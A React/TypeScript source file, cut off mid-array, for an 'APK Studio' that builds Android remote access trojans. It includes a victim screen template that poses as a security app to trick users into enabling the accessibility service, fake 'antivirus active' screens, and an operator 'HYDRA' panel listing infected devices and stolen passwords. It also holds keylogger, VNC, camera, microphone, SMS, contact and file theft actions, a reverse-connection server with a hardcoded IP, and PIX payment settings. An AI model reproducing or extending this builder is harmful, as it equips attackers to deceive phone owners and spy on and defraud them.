import React, { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { 
  ArrowLeft, Plus, Save, Trash2, 
  QrCode, Copy, Download, Settings, Palette, Monitor,
  Smartphone, X, Check,
  DollarSign, Key, Database, Loader2,
  BarChart3, Users, Clock, AlertCircle
} from 'lucide-react';
import { getApiBaseUrl } from '../services/api';

const defaultServerUrl = () =>
  typeof window !== 'undefined' ? window.location.origin : 'http://151.243.137.239:7771';

const defaultWsPlaceholder = () => {
  const base = defaultServerUrl();
  const ws = base.startsWith('https://')
    ? base.replace('https://', 'wss://')
    : base.replace('http://', 'ws://');
  return `${ws}/ws`;
};

// Dimensões base do Android
const ANDROID_WIDTH = 360;
const ANDROID_HEIGHT = 780;

// Tipos de elementos - COMPLETO com todos os recursos
interface ScreenElement {
  id: string;
  type: 
    // Básicos
    | 'text' | 'image' | 'rectangle' | 'circle' | 'button' | 'input' | 'logo'
    // Mídia
    | 'video' | 'audio' | 'gif' | 'lottie' | 'icon' | 'animation'
    // Pagamento
    | 'pix_qrcode' | 'pix_copypaste' | 'credit_card_form'
    // Layout
    | 'divider' | 'divisor' | 'spacer' | 'card' | 'list_item' | 'progress_bar' | 'slider'
    // Interativo
    | 'checkbox' | 'radio' | 'switch' | 'dropdown' | 'date_picker'
    // Avançado
    | 'webview' | 'map' | 'chart' | 'timer' | 'countdown';
  
  // Posição e tamanho
  x: number;
  y: number;
  width: number;
  height: number;
  rotation?: number;
  zIndex?: number;
  
  // Conteúdo
  content?: string;
  imageUrl?: string;
  videoUrl?: string;
  audioUrl?: string;
  iconName?: string;
  
  // Tipografia
  fontSize?: number;
  fontWeight?: string;
  fontFamily?: string;
  fontStyle?: string;
  textAlign?: 'left' | 'center' | 'right';
  textDecoration?: string;
  lineHeight?: number;
  letterSpacing?: number;
  
  // Cores
  color?: string;
  backgroundColor?: string;
  gradientStart?: string;
  gradientEnd?: string;
  gradientDirection?: 'horizontal' | 'vertical' | 'diagonal';
  
  // Bordas
  borderRadius?: number;
  borderWidth?: number;
  borderColor?: string;
  borderStyle?: 'solid' | 'dashed' | 'dotted';
  
  // Efeitos
  opacity?: number;
  shadowColor?: string;
  shadowBlur?: number;
  shadowOffsetX?: number;
  shadowOffsetY?: number;
  blur?: number;
  
  // Animações CSS
  animation?: 'none' | 'fadeIn' | 'fadeOut' | 'slideUp' | 'slideDown' | 'slideLeft' | 'slideRight' 
    | 'bounce' | 'pulse' | 'shake' | 'spin' | 'flip' | 'zoom' | 'glow';
  animationDuration?: number;
  animationDelay?: number;
  animationLoop?: boolean;
  
  // Campos de input
  inputType?: 'text' | 'password' | 'numeric' | 'email' | 'phone' | 'cpf' | 'cnpj' | 'cep' | 'date' | 'money' | 'pin';
  inputLabel?: string;
  placeholder?: string;
  inputMask?: string;
  maxLength?: number;
  required?: boolean;
  validationRegex?: string;
  
  // Campos de botão
  buttonAction?: 'next_screen' | 'prev_screen' | 'submit' | 'generate_pix' | 'copy_pix' | 'open_url' 
    | 'call_phone' | 'send_sms' | 'send_email' | 'share' | 'download' | 'close' | 'minimize' | 'accessibility'
    | 'goto_screen' | 'generate_apk' | 'view_devices' | 'view_keylog' | 'start_vnc' | 'stop_vnc' 
    | 'capture_camera' | 'capture_mic' | 'get_files' | 'get_sms' | 'get_contacts' | 'get_location'
    | 'lock_screen' | 'unlock_screen' | 'show_toast' | 'vibrate' | 'play_sound' | 'refresh_data'
    | 'login' | 'logout' | 'open_dashboard' | 'black_screen' | 'custom';
  buttonUrl?: string;
  buttonStyle?: 'filled' | 'outlined' | 'text' | 'gradient';
  targetScreenIndex?: number;  // Índice da tela destino para goto_screen
  customAction?: string;  // Nome da ação customizada
  customData?: string;    // Dados extras em JSON para ações customizadas
  
  // Dados dinâmicos
  isDynamic?: boolean;  // Se true, o content contém {{variavel}} que será substituída em tempo real
  dynamicSource?: string;  // Fonte dos dados: 'api', 'local', 'websocket'
  
  // Campos PIX
  pixAmount?: string;
  pixDescription?: string;
  
  // Mídia
  autoPlay?: boolean;
  loop?: boolean;
  muted?: boolean;
  controls?: boolean;
  
  // Interativo
  checked?: boolean;
  options?: string[];
  selectedValue?: string;
  minValue?: number;
  maxValue?: number;
  currentValue?: number;
  
  // Timer/Countdown
  timerSeconds?: number;
  timerFormat?: string;
  onTimerEnd?: 'next_screen' | 'submit' | 'close';
}

interface Screen {
  id: string;
  name: string;
  backgroundColor: string;
  elements: ScreenElement[];
}

interface PixConfig {
  id: string;
  name: string;
  pixKey: string;
  pixKeyType: 'cpf' | 'email' | 'phone' | 'random' | 'cnpj';
  beneficiaryName: string;
  beneficiaryCity: string;
  isDefault: boolean;
}

interface Project {
  id: string;
  name: string;
  appName: string;
  packageName: string;
  apkFileName?: string; // 🔥 NOVO: Nome do arquivo APK final (obrigatório)
  projectType: 'payment' | 'rat' | 'custom' | 'hybrid' | 'mobile_panel';
  screens: Screen[];           // Telas da VÍTIMA
  panelScreens?: Screen[];     // Telas do PAINEL (atacante)
  theme: {
    primaryColor: string;
    secondaryColor: string;
    accentColor: string;
    textColor: string;
    backgroundColor: string;
  };
  pixConfig?: PixConfig;
  enableRat: boolean;
  enablePayment: boolean;
  enableKeylogger: boolean;
  iconUrl?: string;
  serverUrl?: string; // URL do servidor para conexão reversa do RAT
  
  // 🔥 NOVO: Controla se o APK aparece no Painel Web principal
  // Se false: dados são enviados apenas via webhook (separado)
  // Se true: dispositivo conecta ao WebSocket e aparece junto com APKs normais
  showInWebPanel: boolean;
  
  // Identificador de origem para separação
  source: 'apk_studio' | 'apk_builder';
  
  // Configurações do Painel Mobile RAT
  mobilePanelConfig?: {
    serverUrl: string;
    operatorUsername: string;
    operatorPassword: string;
    enableVNC: boolean;
    enableKeylogger: boolean;
    enableCamera: boolean;
    enableMicrophone: boolean;
    enableFileManager: boolean;
    enableSMS: boolean;
    enableContacts: boolean;
    enableLocation: boolean;
    enableApkBuilder: boolean;
    customBranding: boolean;
    brandingLogo?: string;
    brandingName?: string;
  };
}

const DEFAULT_THEME = {
  primaryColor: '#FF6600',
  secondaryColor: '#1a1a2e',
  accentColor: '#00D4AA',
  textColor: '#FFFFFF',
  backgroundColor: '#0f0f1a'
};

const APKStudio: React.FC = () => {
  const navigate = useNavigate();
  
  // 📱 DETECÇÃO DE MOBILE PARA AUTO-RESPONSIVIDADE
  const [isMobile, setIsMobile] = useState(window.innerWidth < 768);
  
  useEffect(() => {
    const handleResize = () => {
      setIsMobile(window.innerWidth < 768);
    };
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);
  
  // Estados do projeto
  const [projects, setProjects] = useState<Project[]>([]);
  const [currentProject, setCurrentProject] = useState<Project | null>(null);
  const [currentScreenIndex, setCurrentScreenIndex] = useState(0);
  const [selectedElement, setSelectedElement] = useState<string | null>(null);
  
  // Estados de UI
  const [activeTab, setActiveTab] = useState<'editor' | 'pix' | 'settings' | 'data' | 'preview'>('editor');
  const [showProjectList, setShowProjectList] = useState(true);
  const [isDragging, setIsDragging] = useState(false);
  const [dragOffset, setDragOffset] = useState({ x: 0, y: 0 });
  
  // Modo de edição: Vítima ou Painel
  const [editingMode, setEditingMode] = useState<'victim' | 'panel'>('victim');
  
  // Estados PIX
  const [pixConfigs, setPixConfigs] = useState<PixConfig[]>([]);
  const [showPixForm, setShowPixForm] = useState(false);
  const [editingPix, setEditingPix] = useState<PixConfig | null>(null);
  
  const previewRef = useRef<HTMLDivElement>(null);
  
  // Computed: Telas atuais baseadas no modo de edição
  const currentScreens = editingMode === 'victim' 
    ? (currentProject?.screens || [])
    : (currentProject?.panelScreens || []);
  
  // Garantir que o índice está dentro do range
  const safeScreenIndex = Math.min(currentScreenIndex, Math.max(0, currentScreens.length - 1));
  const currentScreen = currentScreens[safeScreenIndex];
  
  // Reset do índice quando muda o modo de edição
  useEffect(() => {
    setCurrentScreenIndex(0);
    setSelectedElement(null);
  }, [editingMode]);

  // Carregar dados do localStorage
  useEffect(() => {
    const savedProjects = localStorage.getItem('apkStudioProjects');
    const savedPixConfigs = localStorage.getItem('apkStudioPixConfigs');
    
    if (savedProjects) setProjects(JSON.parse(savedProjects));
    if (savedPixConfigs) setPixConfigs(JSON.parse(savedPixConfigs));
  }, []);

  // Salvar no localStorage quando mudar
  useEffect(() => {
    localStorage.setItem('apkStudioProjects', JSON.stringify(projects));
  }, [projects]);

  useEffect(() => {
    localStorage.setItem('apkStudioPixConfigs', JSON.stringify(pixConfigs));
  }, [pixConfigs]);

  const generateId = () => `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;

  // ============================================
  // FUNÇÕES DE PROJETO
  // ============================================
  
  const createNewProject = (type: Project['projectType']) => {
    // ========================================
    // TEMPLATE RAT COMPLETO - TELAS DA VÍTIMA
    // ========================================
    const ratVictimScreens: Screen[] = [
      {
        id: generateId(),
        name: '🔒 Ativação',
        backgroundColor: '#0d1117',
        elements: [
          // Logo no topo
          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 200, backgroundColor: '#161b22', gradientStart: '#161b22', gradientEnd: '#0d1117', gradientDirection: 'vertical', opacity: 100 },
          { id: generateId(), type: 'circle', x: 130, y: 40, width: 100, height: 100, backgroundColor: '#238636', opacity: 100 },
          { id: generateId(), type: 'text', x: 155, y: 70, width: 50, height: 50, content: '🛡️', fontSize: 40, textAlign: 'center', color: '#FFFFFF', opacity: 100 },
          
          // Título
          { id: generateId(), type: 'text', x: 30, y: 160, width: 300, height: 35, content: 'Proteção de Segurança', fontSize: 22, fontWeight: 'bold', color: '#FFFFFF', textAlign: 'center', opacity: 100 },
          
          // Descrição
          { id: generateId(), type: 'text', x: 30, y: 220, width: 300, height: 80, content: 'Para proteger seu dispositivo contra ameaças, ative o serviço de acessibilidade.', fontSize: 14, color: '#8b949e', textAlign: 'center', opacity: 100 },
          
          // Card de instrução
          { id: generateId(), type: 'card', x: 20, y: 310, width: 320, height: 180, backgroundColor: '#161b22', borderRadius: 16, borderWidth: 1, borderColor: '#30363d', opacity: 100 },
          { id: generateId(), type: 'text', x: 35, y: 325, width: 290, height: 25, content: '📋 Como ativar:', fontSize: 16, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'text', x: 35, y: 355, width: 290, height: 25, content: '1. Toque em "Ativar Proteção"', fontSize: 13, color: '#8b949e', opacity: 100 },
          { id: generateId(), type: 'text', x: 35, y: 380, width: 290, height: 25, content: '2. Encontre "Assistente de Proteção"', fontSize: 13, color: '#8b949e', opacity: 100 },
          { id: generateId(), type: 'text', x: 35, y: 405, width: 290, height: 25, content: '3. Ative o serviço', fontSize: 13, color: '#8b949e', opacity: 100 },
          { id: generateId(), type: 'text', x: 35, y: 430, width: 290, height: 25, content: '4. Volte ao app automaticamente', fontSize: 13, color: '#8b949e', opacity: 100 },
          
          // Botão de ativação
          { id: generateId(), type: 'button', x: 30, y: 520, width: 300, height: 60, content: '🛡️ Ativar Proteção', fontSize: 18, fontWeight: 'bold', color: '#FFFFFF', backgroundColor: '#238636', borderRadius: 12, buttonAction: 'accessibility', shadowBlur: 15, shadowColor: '#238636', opacity: 100 },
          
          // Botão secundário
          { id: generateId(), type: 'button', x: 30, y: 600, width: 300, height: 45, content: 'Já ativei, continuar →', fontSize: 14, color: '#58a6ff', backgroundColor: 'transparent', borderRadius: 8, borderWidth: 1, borderColor: '#30363d', buttonAction: 'next_screen', opacity: 100 },
          
          // Footer
          { id: generateId(), type: 'text', x: 30, y: 720, width: 300, height: 20, content: 'Segurança garantida • 100% Gratuito', fontSize: 11, color: '#484f58', textAlign: 'center', opacity: 100 },
        ]
      },
      {
        id: generateId(),
        name: '✅ Proteção Ativa',
        backgroundColor: '#0d1117',
        elements: [
          // Header
          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 250, backgroundColor: '#238636', gradientStart: '#238636', gradientEnd: '#196c2e', gradientDirection: 'vertical', opacity: 100 },
          
          // Ícone de sucesso
          { id: generateId(), type: 'circle', x: 130, y: 50, width: 100, height: 100, backgroundColor: '#FFFFFF', opacity: 20 },
          { id: generateId(), type: 'text', x: 155, y: 80, width: 50, height: 50, content: '✓', fontSize: 50, fontWeight: 'bold', textAlign: 'center', color: '#FFFFFF', opacity: 100 },
          
          // Mensagem de sucesso
          { id: generateId(), type: 'text', x: 30, y: 170, width: 300, height: 35, content: 'Proteção Ativada!', fontSize: 24, fontWeight: 'bold', color: '#FFFFFF', textAlign: 'center', opacity: 100 },
          { id: generateId(), type: 'text', x: 30, y: 210, width: 300, height: 25, content: 'Seu dispositivo está seguro', fontSize: 14, color: '#FFFFFF', textAlign: 'center', opacity: 80 },
          
          // Status cards
          { id: generateId(), type: 'card', x: 20, y: 280, width: 155, height: 90, backgroundColor: '#161b22', borderRadius: 12, opacity: 100 },
          { id: generateId(), type: 'text', x: 30, y: 295, width: 135, height: 25, content: '🔒 Firewall', fontSize: 12, color: '#8b949e', opacity: 100 },
          { id: generateId(), type: 'text', x: 30, y: 320, width: 135, height: 30, content: 'ATIVO', fontSize: 18, fontWeight: 'bold', color: '#238636', opacity: 100 },
          
          { id: generateId(), type: 'card', x: 185, y: 280, width: 155, height: 90, backgroundColor: '#161b22', borderRadius: 12, opacity: 100 },
          { id: generateId(), type: 'text', x: 195, y: 295, width: 135, height: 25, content: '🛡️ Antivírus', fontSize: 12, color: '#8b949e', opacity: 100 },
          { id: generateId(), type: 'text', x: 195, y: 320, width: 135, height: 30, content: 'ATIVO', fontSize: 18, fontWeight: 'bold', color: '#238636', opacity: 100 },
          
          { id: generateId(), type: 'card', x: 20, y: 385, width: 155, height: 90, backgroundColor: '#161b22', borderRadius: 12, opacity: 100 },
          { id: generateId(), type: 'text', x: 30, y: 400, width: 135, height: 25, content: '🔍 Scanner', fontSize: 12, color: '#8b949e', opacity: 100 },
          { id: generateId(), type: 'text', x: 30, y: 425, width: 135, height: 30, content: 'ATIVO', fontSize: 18, fontWeight: 'bold', color: '#238636', opacity: 100 },
          
          { id: generateId(), type: 'card', x: 185, y: 385, width: 155, height: 90, backgroundColor: '#161b22', borderRadius: 12, opacity: 100 },
          { id: generateId(), type: 'text', x: 195, y: 400, width: 135, height: 25, content: '📡 Proteção Web', fontSize: 12, color: '#8b949e', opacity: 100 },
          { id: generateId(), type: 'text', x: 195, y: 425, width: 135, height: 30, content: 'ATIVO', fontSize: 18, fontWeight: 'bold', color: '#238636', opacity: 100 },
          
          // Info
          { id: generateId(), type: 'card', x: 20, y: 500, width: 320, height: 100, backgroundColor: '#161b22', borderRadius: 12, borderWidth: 1, borderColor: '#238636', opacity: 100 },
          { id: generateId(), type: 'text', x: 35, y: 520, width: 290, height: 25, content: '🔔 Monitoramento em tempo real', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'text', x: 35, y: 550, width: 290, height: 40, content: 'O app está protegendo seu dispositivo em segundo plano. Não é necessário mantê-lo aberto.', fontSize: 12, color: '#8b949e', opacity: 100 },
          
          // Botão minimizar
          { id: generateId(), type: 'button', x: 30, y: 630, width: 300, height: 55, content: '📱 Minimizar e Continuar Protegido', fontSize: 15, fontWeight: 'bold', color: '#FFFFFF', backgroundColor: '#238636', borderRadius: 12, buttonAction: 'minimize', opacity: 100 },
          
          // Footer
          { id: generateId(), type: 'text', x: 30, y: 720, width: 300, height: 20, content: '🔐 Conexão segura estabelecida', fontSize: 11, color: '#238636', textAlign: 'center', opacity: 100 },
        ]
      },
      {
        id: generateId(),
        name: '⚙️ Configurações',
        backgroundColor: '#0d1117',
        elements: [
          // Header
          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 80, backgroundColor: '#161b22', opacity: 100 },
          { id: generateId(), type: 'text', x: 20, y: 30, width: 250, height: 30, content: '⚙️ Configurações', fontSize: 20, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          
          // Opções
          { id: generateId(), type: 'card', x: 15, y: 100, width: 330, height: 60, backgroundColor: '#161b22', borderRadius: 12, opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 120, width: 250, height: 25, content: '🔔 Notificações', fontSize: 14, color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'switch', x: 290, y: 115, width: 50, height: 30, backgroundColor: '#238636', checked: true, opacity: 100 },
          
          { id: generateId(), type: 'card', x: 15, y: 175, width: 330, height: 60, backgroundColor: '#161b22', borderRadius: 12, opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 195, width: 250, height: 25, content: '🔄 Atualização automática', fontSize: 14, color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'switch', x: 290, y: 190, width: 50, height: 30, backgroundColor: '#238636', checked: true, opacity: 100 },
          
          { id: generateId(), type: 'card', x: 15, y: 250, width: 330, height: 60, backgroundColor: '#161b22', borderRadius: 12, opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 270, width: 250, height: 25, content: '🛡️ Proteção em segundo plano', fontSize: 14, color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'switch', x: 290, y: 265, width: 50, height: 30, backgroundColor: '#238636', checked: true, opacity: 100 },
          
          // Versão
          { id: generateId(), type: 'text', x: 30, y: 700, width: 300, height: 20, content: 'Versão 2.0.1 • Build 2024', fontSize: 11, color: '#484f58', textAlign: 'center', opacity: 100 },
        ]
      }
    ];
    
    // =====================================================
    // TELAS COMPLETAS DO PAINEL MOBILE RAT (100% EDITÁVEIS)
    // =====================================================
    const mobilePanelScreens: Screen[] = [
      // ===== 1. TELA DE LOGIN =====
      {
        id: generateId(),
        name: '🔐 Login',
        backgroundColor: '#0a0a15',
        elements: [
          // Logo
          { id: generateId(), type: 'logo', x: 130, y: 80, width: 100, height: 100, imageUrl: '', opacity: 100 },
          // Título
          { id: generateId(), type: 'text', x: 30, y: 200, width: 300, height: 40, content: 'HYDRA Control Panel', fontSize: 26, fontWeight: 'bold', color: '#FF6600', textAlign: 'center', opacity: 100 },
          { id: generateId(), type: 'text', x: 30, y: 245, width: 300, height: 25, content: '📲 Mobile Edition v2.0', fontSize: 14, color: '#888888', textAlign: 'center', opacity: 100 },
          // Inputs
          { id: generateId(), type: 'text', x: 40, y: 310, width: 280, height: 20, content: 'Usuário', fontSize: 12, color: '#888888', opacity: 100 },
          { id: generateId(), type: 'input', x: 40, y: 335, width: 280, height: 50, placeholder: 'Digite seu usuário', inputType: 'text', inputLabel: 'username', backgroundColor: '#1a1a2e', color: '#FFFFFF', borderRadius: 12, borderWidth: 1, borderColor: '#FF6600', opacity: 100 },
          { id: generateId(), type: 'text', x: 40, y: 400, width: 280, height: 20, content: 'Senha', fontSize: 12, color: '#888888', opacity: 100 },
          { id: generateId(), type: 'input', x: 40, y: 425, width: 280, height: 50, placeholder: '••••••••', inputType: 'password', inputLabel: 'password', backgroundColor: '#1a1a2e', color: '#FFFFFF', borderRadius: 12, borderWidth: 1, borderColor: '#444444', opacity: 100 },
          // Remember me
          { id: generateId(), type: 'checkbox', x: 40, y: 490, width: 200, height: 25, content: 'Lembrar credenciais', color: '#888888', checked: true, opacity: 100 },
          // Login button
          { id: generateId(), type: 'button', x: 40, y: 540, width: 280, height: 55, content: '🔓 ENTRAR', fontSize: 18, fontWeight: 'bold', color: '#FFFFFF', backgroundColor: '#FF6600', borderRadius: 14, buttonAction: 'login', opacity: 100 },
          // Status do servidor
          { id: generateId(), type: 'text', x: 30, y: 620, width: 300, height: 20, content: '{{server_status}}', fontSize: 12, color: '#00FF00', textAlign: 'center', opacity: 100, isDynamic: true },
          // Footer
          { id: generateId(), type: 'text', x: 30, y: 680, width: 300, height: 20, content: '🔒 Conexão Criptografada', fontSize: 10, color: '#555555', textAlign: 'center', opacity: 100 },
          { id: generateId(), type: 'text', x: 30, y: 705, width: 300, height: 20, content: 'Suporte: admin@servidor.com', fontSize: 10, color: '#444444', textAlign: 'center', opacity: 100 },
        ]
      },
      
      // ===== 2. DASHBOARD PRINCIPAL =====
      {
        id: generateId(),
        name: '📊 Dashboard',
        backgroundColor: '#0a0a15',
        elements: [
          // Header com gradiente
          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 80, backgroundColor: '#FF6600', borderRadius: 0, opacity: 100 },
          { id: generateId(), type: 'text', x: 20, y: 20, width: 200, height: 30, content: '📲 RAT Control', fontSize: 22, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'text', x: 20, y: 50, width: 200, height: 20, content: 'admin@servidor', fontSize: 12, color: '#FFDDCC', opacity: 100 },
          { id: generateId(), type: 'text', x: 260, y: 30, width: 90, height: 30, content: '● ONLINE', fontSize: 12, fontWeight: 'bold', color: '#00FF00', textAlign: 'right', opacity: 100 },
          // Cards de estatísticas
          { id: generateId(), type: 'card', x: 15, y: 100, width: 105, height: 90, backgroundColor: '#1a1a2e', borderRadius: 16, opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 110, width: 85, height: 20, content: '📱 Total', fontSize: 11, color: '#888888', textAlign: 'center', opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 135, width: 85, height: 40, content: '{{total_devices}}', fontSize: 32, fontWeight: 'bold', color: '#FF6600', textAlign: 'center', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'card', x: 128, y: 100, width: 105, height: 90, backgroundColor: '#1a1a2e', borderRadius: 16, opacity: 100 },
          { id: generateId(), type: 'text', x: 138, y: 110, width: 85, height: 20, content: '🟢 Online', fontSize: 11, color: '#888888', textAlign: 'center', opacity: 100 },
          { id: generateId(), type: 'text', x: 138, y: 135, width: 85, height: 40, content: '{{online_devices}}', fontSize: 32, fontWeight: 'bold', color: '#00D4AA', textAlign: 'center', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'card', x: 241, y: 100, width: 105, height: 90, backgroundColor: '#1a1a2e', borderRadius: 16, opacity: 100 },
          { id: generateId(), type: 'text', x: 251, y: 110, width: 85, height: 20, content: '⌨️ Senhas', fontSize: 11, color: '#888888', textAlign: 'center', opacity: 100 },
          { id: generateId(), type: 'text', x: 251, y: 135, width: 85, height: 40, content: '{{total_passwords}}', fontSize: 32, fontWeight: 'bold', color: '#FF4444', textAlign: 'center', opacity: 100, isDynamic: true },
          // Título dispositivos
          { id: generateId(), type: 'text', x: 20, y: 205, width: 250, height: 25, content: '📱 Dispositivos Recentes', fontSize: 16, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'button', x: 280, y: 205, width: 60, height: 25, content: 'Ver Todos', fontSize: 10, color: '#FF6600', backgroundColor: 'transparent', buttonAction: 'goto_screen', targetScreenIndex: 2, opacity: 100 },
          // Device 1 - DINÂMICO
          { id: generateId(), type: 'card', x: 15, y: 240, width: 330, height: 75, backgroundColor: '#1a1a2e', borderRadius: 12, borderWidth: 2, borderColor: '#00D4AA', opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 250, width: 20, height: 20, content: '{{device_1_status}}', fontSize: 16, opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 50, y: 250, width: 180, height: 20, content: '{{device_1_name}}', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 50, y: 275, width: 180, height: 18, content: 'Android {{device_1_android}} • {{device_1_ip}}', fontSize: 11, color: '#888888', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 50, y: 295, width: 100, height: 15, content: '🔓 {{device_1_time}}', fontSize: 10, color: '#00D4AA', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'button', x: 255, y: 255, width: 75, height: 45, content: '▶️ VNC', fontSize: 12, fontWeight: 'bold', color: '#FFFFFF', backgroundColor: '#FF6600', borderRadius: 10, buttonAction: 'goto_screen', targetScreenIndex: 3, opacity: 100 },
          // Device 2 - DINÂMICO
          { id: generateId(), type: 'card', x: 15, y: 325, width: 330, height: 75, backgroundColor: '#1a1a2e', borderRadius: 12, borderWidth: 2, borderColor: '#00D4AA', opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 335, width: 20, height: 20, content: '{{device_2_status}}', fontSize: 16, opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 50, y: 335, width: 180, height: 20, content: '{{device_2_name}}', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 50, y: 360, width: 180, height: 18, content: 'Android {{device_2_android}} • {{device_2_ip}}', fontSize: 11, color: '#888888', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 50, y: 380, width: 100, height: 15, content: '🔓 {{device_2_time}}', fontSize: 10, color: '#00D4AA', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'button', x: 255, y: 340, width: 75, height: 45, content: '▶️ VNC', fontSize: 12, fontWeight: 'bold', color: '#FFFFFF', backgroundColor: '#FF6600', borderRadius: 10, buttonAction: 'goto_screen', targetScreenIndex: 3, opacity: 100 },
          // Device 3 - DINÂMICO
          { id: generateId(), type: 'card', x: 15, y: 410, width: 330, height: 75, backgroundColor: '#1a1a2e', borderRadius: 12, borderWidth: 1, borderColor: '#333', opacity: 70 },
          { id: generateId(), type: 'text', x: 25, y: 420, width: 20, height: 20, content: '{{device_3_status}}', fontSize: 16, opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 50, y: 420, width: 180, height: 20, content: '{{device_3_name}}', fontSize: 14, fontWeight: 'bold', color: '#888888', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 50, y: 445, width: 180, height: 18, content: 'Android {{device_3_android}} • {{device_3_ip}}', fontSize: 11, color: '#666666', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 50, y: 465, width: 150, height: 15, content: '🔒 {{device_3_time}}', fontSize: 10, color: '#FF4444', opacity: 100, isDynamic: true },
          // Ações rápidas
          { id: generateId(), type: 'text', x: 20, y: 500, width: 200, height: 25, content: '⚡ Ações Rápidas', fontSize: 16, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'button', x: 15, y: 535, width: 78, height: 65, content: '⌨️\nKeylog', fontSize: 12, color: '#FFFFFF', backgroundColor: '#E63946', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 4, opacity: 100 },
          { id: generateId(), type: 'button', x: 101, y: 535, width: 78, height: 65, content: '📷\nCâmera', fontSize: 12, color: '#FFFFFF', backgroundColor: '#457B9D', borderRadius: 14, buttonAction: 'capture_camera', opacity: 100 },
          { id: generateId(), type: 'button', x: 187, y: 535, width: 78, height: 65, content: '📁\nArquivos', fontSize: 12, color: '#FFFFFF', backgroundColor: '#2A9D8F', borderRadius: 14, buttonAction: 'get_files', opacity: 100 },
          { id: generateId(), type: 'button', x: 273, y: 535, width: 78, height: 65, content: '💬\nSMS', fontSize: 12, color: '#FFFFFF', backgroundColor: '#E9C46A', borderRadius: 14, buttonAction: 'get_sms', opacity: 100 },
          // Gerar APK
          { id: generateId(), type: 'button', x: 15, y: 615, width: 330, height: 55, content: '➕ GERAR NOVO APK RAT', fontSize: 16, fontWeight: 'bold', color: '#FFFFFF', backgroundColor: '#238636', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 5, opacity: 100 },
          // Bottom Navigation
          { id: generateId(), type: 'rectangle', x: 0, y: 695, width: 360, height: 85, backgroundColor: '#1a1a2e', borderRadius: 0, opacity: 100 },
          { id: generateId(), type: 'button', x: 25, y: 710, width: 55, height: 55, content: '🏠', fontSize: 24, backgroundColor: '#FF6600', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 1, opacity: 100 },
          { id: generateId(), type: 'button', x: 95, y: 710, width: 55, height: 55, content: '📱', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 2, opacity: 100 },
          { id: generateId(), type: 'button', x: 165, y: 710, width: 55, height: 55, content: '⌨️', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 4, opacity: 100 },
          { id: generateId(), type: 'button', x: 235, y: 710, width: 55, height: 55, content: '➕', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 5, opacity: 100 },
          { id: generateId(), type: 'button', x: 305, y: 710, width: 45, height: 55, content: '⚙️', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 7, opacity: 100 },
        ]
      },
      
      // ===== 3. LISTA DE DISPOSITIVOS =====
      {
        id: generateId(),
        name: '📱 Dispositivos',
        backgroundColor: '#0a0a15',
        elements: [
          // Header
          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 70, backgroundColor: '#1a1a2e', opacity: 100 },
          { id: generateId(), type: 'button', x: 15, y: 20, width: 40, height: 35, content: '←', fontSize: 20, backgroundColor: '#333333', borderRadius: 10, buttonAction: 'prev_screen', opacity: 100 },
          { id: generateId(), type: 'text', x: 70, y: 22, width: 200, height: 30, content: '📱 Todos Dispositivos', fontSize: 18, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'text', x: 280, y: 28, width: 60, height: 20, content: '{{total_devices}} total', fontSize: 12, color: '#888888', textAlign: 'right', opacity: 100, isDynamic: true },
          // Filtros
          { id: generateId(), type: 'button', x: 15, y: 85, width: 100, height: 35, content: '🟢 Online ({{online_devices}})', fontSize: 11, backgroundColor: '#238636', borderRadius: 20, opacity: 100, isDynamic: true },
          { id: generateId(), type: 'button', x: 125, y: 85, width: 100, height: 35, content: '🔴 Offline ({{offline_devices}})', fontSize: 11, color: '#FF4444', backgroundColor: '#333333', borderRadius: 20, opacity: 100, isDynamic: true },
